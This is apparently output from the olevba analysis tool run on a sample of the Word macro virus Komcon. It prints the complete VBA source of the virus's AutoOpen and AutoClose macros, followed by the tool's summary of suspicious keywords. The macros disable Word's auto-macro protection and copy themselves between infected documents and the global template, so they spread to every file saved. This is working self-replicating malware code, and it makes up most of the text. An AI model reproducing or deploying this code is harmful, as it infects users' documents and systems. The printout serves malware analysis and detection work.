olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Komcon-6d91b0cd2b0052b9e285805697ce67f5b0118347
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Komcon-6d91b0cd2b0052b9e285805697ce67f5b0118347 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Komcon-6d91b0cd2b0052b9e285805697ce67f5b0118347 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim sMe$
Dim sMacro$
'MsgBox MacroFileName$()
WordBasic.DisableAutoMacros 0
On Error GoTo -1: On Error GoTo Abort

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()

    WordBasic.FileSaveAs dlg


'--------------------------------------------------------

sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sMacro$
WordBasic.FileSaveAs dlg
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Komcon-6d91b0cd2b0052b9e285805697ce67f5b0118347 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$

sMe$ = WordBasic.[FileName$]()
'MsgBox MacroFileName$()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy sMacro$, "Global:AutoClose"
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sMacro$, "Global:AutoOpen"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

